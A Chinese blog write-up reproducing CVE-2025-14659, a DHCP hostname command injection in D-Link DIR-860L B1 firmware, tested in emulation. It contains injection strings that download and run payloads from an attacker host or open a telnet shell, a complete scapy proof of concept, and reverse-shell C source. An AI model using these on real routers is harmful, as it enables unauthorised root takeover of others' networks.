  <entry>
    <title>CVE-2025-14659 D-Link DIR-860LB1 v203b03 命令注入漏洞</title>
    <url>/2026/10/24/cve-2025-14659-dlink-dir-860l-b1/</url>
    <content><![CDATA[<h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -Me DIR-860L_B1_FW203b03.bin</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><p>配置网卡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 123 | sudo -S ip tuntap add dev tap10_0 mode tap</span><br><span class="line">echo 123 | sudo -S ip link set tap10_0 up</span><br><span class="line">echo 123 | sudo -S ip addr add 192.168.0.2/24 dev tap10_0</span><br></pre></td></tr></table></figure>

<p>启动qemu</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 123 | sudo -S qemu-system-mipsel \</span><br><span class="line">  -m 1024 -M malta \</span><br><span class="line">  -kernel binaries/vmlinux.mipsel.4 \</span><br><span class="line">  -drive if=ide,format=raw,file=scratch/10/image.raw \</span><br><span class="line">  -append &quot;root=/dev/sda1 console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 \</span><br><span class="line">           rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 \</span><br><span class="line">           FIRMAE_NET=true FIRMAE_NVRAM=true FIRMAE_KERNEL=true FIRMAE_ETC=true \</span><br><span class="line">           user_debug=0 firmadyne.syscall=1&quot; \</span><br><span class="line">  -serial file:scratch/10/qemu.final.serial.log \</span><br><span class="line">  -serial unix:/tmp/qemu.10.S1,server,nowait \</span><br><span class="line">  -monitor unix:/tmp/qemu.10,server,nowait \</span><br><span class="line">  -display none \</span><br><span class="line">  -device e1000,netdev=net0 -netdev socket,id=net0,listen=:2000 \</span><br><span class="line">  -device e1000,netdev=net1 -netdev socket,id=net1,listen=:2001 \</span><br><span class="line">  -device e1000,netdev=net2 -netdev tap,id=net2,ifname=tap10_0,script=no \</span><br><span class="line">  -device e1000,netdev=net3 -netdev socket,id=net3,listen=:2003</span><br></pre></td></tr></table></figure>

<p><img src="/img/cve-2025-14659-dlink-dir-860l-b1/01.png"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>资料中描述了漏洞信息，在DHCP守护进程中发现了RCE，并且是在处理现有IP地址的DHCP REQUEST消息中。</p>
<p>去看udhcpd这个组件</p>
<p>从借鉴的文章中直接定位到这个处理DHCP的函数</p>
<p><img src="/img/cve-2025-14659-dlink-dir-860l-b1/02.png"></p>
<p>然后再往下就能看到一个system()函数</p>
<p><img src="/img/cve-2025-14659-dlink-dir-860l-b1/03.png"></p>
<p><img src="/img/cve-2025-14659-dlink-dir-860l-b1/04.png"></p>
<p>从这里可以看到服务器循环接收 DHCP 报文，读取 Option 53决定走哪个分支</p>
<p><img src="/img/cve-2025-14659-dlink-dir-860l-b1/05.png"></p>
<p>case3会通过get_option()直接从客户端DHCP REQUEST包中提取Option12，然后复制到v33，没有过滤地去把MAC(%s)、IP(%s)、hostname(%s)拼成命令字符串</p>
<p><img src="/img/cve-2025-14659-dlink-dir-860l-b1/06.png"></p>
<p>也就是在流程图的这个地方，Option 12 &#x3D; Hostname，攻击者可控，是命令注入的输入点</p>
<p><img src="/img/cve-2025-14659-dlink-dir-860l-b1/07.png"></p>
<p>如果找到现有租约</p>
<p><img src="/img/cve-2025-14659-dlink-dir-860l-b1/08.png"></p>
<p>发送ACK，确认续租</p>
<p><img src="/img/cve-2025-14659-dlink-dir-860l-b1/09.png"></p>
<p>那接下来就只需要用一个 shell 分隔符 ; 把可控的hostname的内容截成新命令</p>
<p>可以输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MyHost ; wget http://192.168.0.142:6666/evil.sh ; sh evil.sh ;</span><br></pre></td></tr></table></figure>

<p>最终整条system执行的就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usockc /var/mydlinkeventd_usock NEW_DEVICE,76:e4:ab:1e:fe:40,192.168.0.142,MyHost ; wget http://... ; sh evil.sh ;\n</span><br></pre></td></tr></table></figure>

<p>但是就像这里</p>
<p><img src="/img/cve-2025-14659-dlink-dir-860l-b1/10.png"></p>
<p>我们先需要一个hostname才能进入我们的命令注入点</p>
<p>因此我们必须先拥有合法的租约，并且在发送的恶意 REQUEST 包中包含 Hostname 字段，才能进入这个注入点</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>先拿一次租约</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 123 | sudo -S dhclient -v -1 tap10_0</span><br></pre></td></tr></table></figure>

<p><img src="/img/cve-2025-14659-dlink-dir-860l-b1/11.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MAC      = &quot;aa:1d:62:32:cf:ab&quot;</span><br><span class="line">REQ_IP   = &quot;192.168.0.163&quot;</span><br><span class="line">SERVER   = &quot;192.168.0.1&quot;</span><br><span class="line">HOSTNAME = &quot;; telnetd -l /bin/sh -p 9999 ;&quot;</span><br></pre></td></tr></table></figure>

<p>再关闭dhclicent防止后面干扰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo killall dhclient</span><br></pre></td></tr></table></figure>

<p>然后开一个终端，准备给路由器传payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>

<p>再开一个nc监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>

<p>发恶意 DHCP REQUEST</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 123 | sudo -S python3 rev_shell.py tap10_0</span><br></pre></td></tr></table></figure>

<p>发送的 Hostname是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; wget http://192.168.0.2:8000/shell.elf -O /tmp/s; chmod +x /tmp/s; /tmp/s 192.168.0.2 4444 &amp;</span><br></pre></td></tr></table></figure>

<p>拼进 udhcpd 的 system() 后，实际执行的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usockc /var/mydlinkeventd_usock NEW_DEVICE,aa:1d:62:32:cf:ab,192.168.0.163,; wget http://192.168.0.2:8000/shell.elf -O /tmp/s; chmod +x /tmp/s; /tmp/s 192.168.0.2 4444 &amp;</span><br></pre></td></tr></table></figure>

<p>然后路由器就会wget 下载 -&gt;chmod +x-&gt;&#x2F;tmp&#x2F;s 后台回连</p>
<p><img src="/img/cve-2025-14659-dlink-dir-860l-b1/12.png"></p>
<p><img src="/img/cve-2025-14659-dlink-dir-860l-b1/13.png"></p>
<p>监听端口会收到连接，直接就是 root shell</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># CVE-2025-14659  PoC：D-Link DIR-860L B1 udhcpd Hostname 命令注入</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- 改成你 dhclient 拿到/网卡实际的值 ----</span></span><br><span class="line">IFACE    = <span class="string">&quot;tap10_0&quot;</span></span><br><span class="line">MAC      = <span class="string">&quot;aa:1d:62:32:cf:ab&quot;</span>     <span class="comment"># 网卡 MAC</span></span><br><span class="line">REQ_IP   = <span class="string">&quot;192.168.0.163&quot;</span>         <span class="comment"># dhclient 分配的租约 IP</span></span><br><span class="line">SERVER   = <span class="string">&quot;192.168.0.1&quot;</span>           <span class="comment"># 路由器(DHCP 服务器)</span></span><br><span class="line">XID      = <span class="number">0x12345678</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- 注入点：Option 12 Hostname，靠 ; 截断命令 ----</span></span><br><span class="line">HOSTNAME = <span class="string">&quot;; telnetd -l /bin/sh -p 9999 ;&quot;</span></span><br><span class="line"></span><br><span class="line">mac_bytes = <span class="built_in">bytes</span>.fromhex(MAC.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line">pkt = (Ether(src=MAC, dst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)</span><br><span class="line">       / IP(src=<span class="string">&quot;0.0.0.0&quot;</span>, dst=<span class="string">&quot;255.255.255.255&quot;</span>)</span><br><span class="line">       / UDP(sport=<span class="number">68</span>, dport=<span class="number">67</span>)</span><br><span class="line">       / BOOTP(chaddr=mac_bytes, xid=XID)</span><br><span class="line">       / DHCP(options=[</span><br><span class="line">           (<span class="string">&quot;message-type&quot;</span>, <span class="string">&quot;request&quot;</span>),</span><br><span class="line">           (<span class="string">&quot;requested_addr&quot;</span>, REQ_IP),</span><br><span class="line">           (<span class="string">&quot;server_id&quot;</span>, SERVER),</span><br><span class="line">           (<span class="string">&quot;hostname&quot;</span>, HOSTNAME),   <span class="comment"># &lt;== 漏洞点</span></span><br><span class="line">           <span class="string">&quot;end&quot;</span></span><br><span class="line">       ]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    sendp(pkt, iface=IFACE, verbose=<span class="literal">False</span>)</span><br><span class="line">    time.sleep(<span class="number">0.4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] sent. hostname =&quot;</span>, HOSTNAME)</span><br></pre></td></tr></table></figure>

<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>shell.elf源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* mipsle 反弹 shell，静态编译后给 DIR-860L 用。</span></span><br><span class="line"><span class="comment">   用法: shell.elf [ip] [port]   (默认 192.168.0.2:4444) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *ip = argc &gt; <span class="number">1</span> ? argv[<span class="number">1</span>] : <span class="string">&quot;192.168.0.2&quot;</span>;</span><br><span class="line">    <span class="type">int</span> port = argc &gt; <span class="number">2</span> ? atoi(argv[<span class="number">2</span>]) : <span class="number">4444</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);        <span class="comment">// 建 TCP socket</span></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">a</span>;</span></span><br><span class="line">    a.sin_family = AF_INET;</span><br><span class="line">    a.sin_port = htons((<span class="type">unsigned</span> <span class="type">short</span>)port);        <span class="comment">// 端口 4444</span></span><br><span class="line">    a.sin_addr.s_addr = inet_addr(ip);               <span class="comment">// 回连 IP 192.168.0.2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (connect(fd, (<span class="keyword">struct</span> sockaddr *)&amp;a, <span class="keyword">sizeof</span>(a)) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">2</span>;  <span class="comment">// 连回攻击机</span></span><br><span class="line"></span><br><span class="line">    dup2(fd, <span class="number">0</span>);                                     <span class="comment">// 把连接接到 stdin</span></span><br><span class="line">    dup2(fd, <span class="number">1</span>);                                     <span class="comment">// stdout</span></span><br><span class="line">    dup2(fd, <span class="number">2</span>);                                     <span class="comment">// stderr</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *sh_argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, sh_argv, <span class="literal">NULL</span>);                <span class="comment">// 变成 /bin/sh</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
